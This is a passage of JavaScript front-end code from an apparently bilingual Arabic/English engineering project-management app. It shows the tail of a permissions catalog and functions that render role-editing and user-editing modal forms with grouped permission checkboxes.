  { id: 'edit_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'تعديل تفاصيل وحالة المهام', nameEn: 'Edit Tasks' },
  { id: 'delete_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'حذف المهام', nameEn: 'Delete Tasks' },
  { id: 'assign_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'إسناد وتوزيع المهام للمنفذين', nameEn: 'Assign Tasks' },
  { id: 'review_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'مراجعة المخرجات الهندسية', nameEn: 'Review Deliverables' },
  { id: 'approve_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'اعتماد وتوقيع المخرجات الهندسية', nameEn: 'Approve Deliverables' },
  { id: 'manage_reminders', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'إدارة التذكيرات والمتابعات', nameEn: 'Manage Reminders' },

  // 📐 المخططات والمكتبة القياسية (Drawings & Deliverables Library)
  { id: 'upload_documents', category: 'documents', categoryAr: 'المخططات والمكتبة القياسية', categoryEn: 'Drawings & Deliverables Library', nameAr: 'رفع وإدارة المخططات والمستندات', nameEn: 'Upload Documents' },
  { id: 'delete_documents', category: 'documents', categoryAr: 'المخططات والمكتبة القياسية', categoryEn: 'Drawings & Deliverables Library', nameAr: 'حذف المخططات والمستندات', nameEn: 'Delete Documents' },
  { id: 'manage_templates', category: 'documents', categoryAr: 'المخططات والمكتبة القياسية', categoryEn: 'Drawings & Deliverables Library', nameAr: 'إدارة مكتبة القوالب والمخرجات القياسية', nameEn: 'Manage Templates Library' },

  // 📊 المؤشرات والتقارير (Analytics & Reports)
  { id: 'view_dashboard', category: 'reports', categoryAr: 'المؤشرات والتقارير', categoryEn: 'Analytics & Reports', nameAr: 'عرض لوحة التحكم والمؤشرات', nameEn: 'View Dashboard' },
  { id: 'view_reports', category: 'reports', categoryAr: 'المؤشرات والتقارير', categoryEn: 'Analytics & Reports', nameAr: 'استعراض وتصدير التقارير الهندسية والمالية', nameEn: 'View Reports' },

  // 🛡️ النظام والأمان (Administration & Governance)
  { id: 'manage_users', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'إدارة ودعوة وتفعيل حسابات المستخدمين', nameEn: 'Manage Users' },
  { id: 'manage_existing_account_permissions', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'تعديل أدوار وصلاحيات الحسابات الموجودة', nameEn: 'Manage Existing Account Permissions' },
  { id: 'view_user_activity', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'متابعة أوقات دخول ونشاط المستخدمين', nameEn: 'View User Logins & Activity Timestamps' },
  { id: 'manage_roles', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'إنشاء وتعديل الأدوار والصلاحيات', nameEn: 'Manage Roles & Permissions' },
  { id: 'manage_settings', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'إدارة إعدادات النظام والشركة ومساحة العمل', nameEn: 'Manage Company & Settings' },
  { id: 'manage_trash', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'إدارة واستعادة سلة المهملات', nameEn: 'Manage Trash' },
  { id: 'view_audit_logs', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'استعراض سجل الرقابة والعمليات الأمنية', nameEn: 'View Audit Logs' }
];

export function openRoleModal(role = null) {
  const catalog = (state.data?.permissionsCatalog && state.data.permissionsCatalog.length >= 10)
    ? state.data.permissionsCatalog
    : FULL_PERMISSIONS_CATALOG;

  // Group by category
  const categoriesMap = new Map();
  catalog.forEach(p => {
    const catKey = p.category || 'general';
    const catName = choose(p.categoryAr || catKey, p.categoryEn || catKey);
    if (!categoriesMap.has(catKey)) {
      categoriesMap.set(catKey, { name: catName, items: [] });
    }
    categoriesMap.get(catKey).items.push(p);
  });

  const isRoleAdmin = role?.id === 'admin' || (role?.permissions && role.permissions.includes('*'));

  const categoriesHtml = Array.from(categoriesMap.entries()).map(([catKey, group]) => {
    const options = group.items.map((permission) => {
      const key = permission.id || permission.key;
      const label = choose(permission.nameAr || permission.ar, permission.nameEn || permission.en || key);
      const isChecked = isRoleAdmin || (role?.permissions && (role.permissions.includes(key) || (typeof PERMISSION_ALIASES !== 'undefined' && PERMISSION_ALIASES[key] && role.permissions.includes(PERMISSION_ALIASES[key]))));
      const isDisabled = isRoleAdmin ? 'disabled' : '';
      return `
        <label class="permission-option" style="cursor:${isRoleAdmin ? 'default' : 'pointer'};">
          <input type="checkbox" name="permissions" value="${esc(key)}" ${isChecked ? 'checked' : ''} ${isDisabled} />
          <span style="font-weight:500;">${esc(label)}</span>
        </label>
      `;
    }).join('');

    return `
      <div class="permission-category-group" style="margin-bottom:12px;">
        <div style="font-size:11.5px;font-weight:700;color:var(--teal);margin-bottom:6px;display:flex;align-items:center;gap:6px;border-bottom:1px solid var(--line);padding-bottom:3px;">
          <span>${esc(group.name)}</span>
          <span style="font-size:10px;font-weight:normal;color:var(--muted);">(${group.items.length})</span>
        </div>
        <div class="permission-grid" style="grid-template-columns:repeat(auto-fit, minmax(210px, 1fr));gap:6px;max-height:none;">
          ${options}
        </div>
      </div>
    `;
  }).join('');

  const selectAllControls = !isRoleAdmin ? `
    <div style="display:flex;justify-content:space-between;align-items:center;margin:15px 0 8px;">
      <p class="field-hint" style="margin:0;font-weight:600;color:var(--ink);">${t('permissions')} <span style="font-weight:normal;color:var(--muted);font-size:11px;">(${catalog.length} ${choose('صلاحية متاحة', 'available permissions')})</span></p>
      <div style="display:inline-flex;gap:6px;">
        <button type="button" class="btn btn-ghost btn-sm" id="btn-perm-select-all" style="font-size:11px;padding:2px 8px;">${choose('تحديد الكل', 'Select All')}</button>
        <button type="button" class="btn btn-ghost btn-sm" id="btn-perm-deselect-all" style="font-size:11px;padding:2px 8px;">${choose('إلغاء التحديد', 'Deselect All')}</button>
      </div>
    </div>
  ` : '';

  const form = `
    <form id="role-form" data-role-id="${esc(role?.id || '')}">
      <div class="form-grid">
        <div class="field">
          <label>${t('nameAr')} *</label>
          <input name="nameAr" value="${esc(role?.nameAr || '')}" required />
        </div>
        <div class="field">
          <label>${t('nameEn')}</label>
          <input name="nameEn" value="${esc(role?.nameEn || '')}" />
        </div>
        <div class="field full">
          <label>${t('roleDescription')}</label>
          <textarea name="descriptionAr" rows="2">${esc(role?.descriptionAr || '')}</textarea>
        </div>
      </div>
      ${isRoleAdmin ? `
        <div class="role-modal-note" style="margin-top:15px;">
          ${choose('مدير النظام يملك صلاحيات الإدارة الشاملة [*] الكاملة على كافة جوانب النظام والشركة ولا يمكن تقليصها.', 'The system administrator always keeps full root privileges [*] across all aspects of the system.')}
        </div>
      ` : `
        ${selectAllControls}
        <div style="max-height:360px;overflow-y:auto;padding-inline-end:4px;border:1px solid var(--line);border-radius:10px;padding:12px;background:var(--surface-soft);">
          ${categoriesHtml}
        </div>
      `}
      <div class="modal-actions" style="margin-top:18px;">
        <button type="button" class="btn btn-ghost" data-action="close-modal">${t('cancel')}</button>
        <button type="submit" class="btn btn-primary">${icon('check', 14)} ${role ? t('save') : t('create')}</button>
      </div>
    </form>
  `;

  document.getElementById('modal-root').innerHTML = modalShell(
    role ? choose('تعديل الدور والصلاحيات', 'Edit role & permissions') : t('addRole'),
    choose('تحديد الصلاحيات الدقيقة لهذا الدور ومجالات الوصول في النظام.', 'Define granular permissions and workspace access levels for this role.'),
    form,
    'role',
    'modal-lg'
  );

  // Wire up Select All / Deselect All
  const modalRoot = document.getElementById('modal-root');
  if (modalRoot) {
    const btnSelectAll = modalRoot.querySelector('#btn-perm-select-all');
    const btnDeselectAll = modalRoot.querySelector('#btn-perm-deselect-all');
    if (btnSelectAll) {
      btnSelectAll.addEventListener('click', () => {
        modalRoot.querySelectorAll('input[name="permissions"]:not(:disabled)').forEach(cb => cb.checked = true);
      });
    }
    if (btnDeselectAll) {
      btnDeselectAll.addEventListener('click', () => {
        modalRoot.querySelectorAll('input[name="permissions"]:not(:disabled)').forEach(cb => cb.checked = false);
      });
    }
  }
}

export function openUserModal(user = null) {
  if (user?.id === 'usr_ahmad' && state.data?.user?.id !== 'usr_ahmad') {
    return showToast(choose('لا يمكن تعديل حساب مدير ومطور النظام.', 'System Developer account is protected.'), true);
  }
  if (!user && !isAdmin()) return showToast(t('adminOnly'), true);
  const permissionOnly = !isAdmin();
  const locked = permissionOnly ? 'disabled' : '';
  const availableRoles = (state.data?.roles || []).filter((role) => isAdmin() || role.id !== 'admin');
  const form = `<form id="user-form" data-user-id="${esc(user?.id || '')}" data-permission-only="${permissionOnly}"><div class="form-grid"><div class="field full"><label>${t('nameAr')}</label><input name="name" value="${esc(user?.name || '')}" ${locked} required /></div><div class="field"><label>${t('nameEn')}</label><input name="nameEn" value="${esc(user?.nameEn || '')}" ${locked} /></div><div class="field"><label>${t('jobTitle')}</label><input name="jobTitleAr" value="${esc(user?.jobTitleAr || '')}" ${locked} /></div><div class="field"><label>${t('email')}</label><input name="email" type="email" value="${esc(user?.email || '')}" placeholder="name@darc.com" ${locked} /></div><div class="field"><label>${t('role')}</label><select name="roleId">${availableRoles.map((role) => `<option value="${esc(role.id)}" ${user?.roleId === role.id ? 'selected' : ''}>${esc(choose(role.nameAr, role.nameEn))}</option>`).join('')}</select></div></div><div class="field-hint">${permissionOnly ? choose('يمكنك هنا تغيير دور الحساب الموجود فقط. إدارة الاسم والبريد والحذف وإضافة الحسابات محصورة بأحمد مدير النظام.', 'Here you can change the role of an existing account only. Names, email, deletion, and account creation remain restricted to Ahmed, the system administrator.') : choose('إذا تركت البريد فارغًا يبقى الحساب مسجلًا داخل الفريق بانتظار دعوة. عند إضافة بريد يمكنك إرسال دعوة من قائمة الحسابات.', 'If email is left blank, the member remains in the team directory awaiting an invite. Add an email to send an invitation from Accounts.')}</div><div class="modal-actions"><button type="button" class="btn btn-ghost" data-action="close-modal">${t('cancel')}</button><button type="submit" class="btn btn-primary">${icon('check', 14)} ${user ? (permissionOnly ? choose('حفظ الصلاحية', 'Save permission') : t('save')) : t('create')}</button></div></form>`;
  document.getElementById('modal-root').innerHTML = modalShell(user ? (permissionOnly ? choose('تعديل صلاحية الحساب', 'Change account permission') : choose('تعديل حساب العضو', 'Edit member account')) : t('addMember'), choose('الصلاحية تحدد ما يستطيع العضو رؤيته وتعديله داخل المشاريع.', 'The role defines what this member can see and change across projects.'), form, 'user');
}
